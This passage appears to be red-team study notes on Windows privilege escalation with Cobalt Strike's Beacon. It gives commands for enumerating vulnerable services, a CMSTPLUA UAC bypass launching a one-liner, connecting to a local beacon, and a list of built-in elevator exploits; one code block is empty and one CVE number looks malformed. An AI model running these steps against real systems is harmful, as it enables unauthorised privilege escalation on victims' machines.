

#### Vulnerable Services

```powershell
sc_enum
```

> When abusing services, the dedicated svc.exe payloads must be used.

```powershell

```


#### UAC Bypass

> Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.

Execute UAC bypasss
```powershell
runasadmin uac-cmstplua [ONE-LINER]
```

Connect to beacon
```powershell
connect localhost 1337
```

More can be found here
```powershell
beacon> runasadmin

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    ms16-032                        Secondary Logon Handle Privilege Escalation (CVE-2016-099)
    uac-cmstplua                    Bypass UAC with CMSTPLUA COM interface
    uac-eventvwr                    Bypass UAC with eventvwr.exe
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
    uac-wscript                     Bypass UAC with wscript.exe
```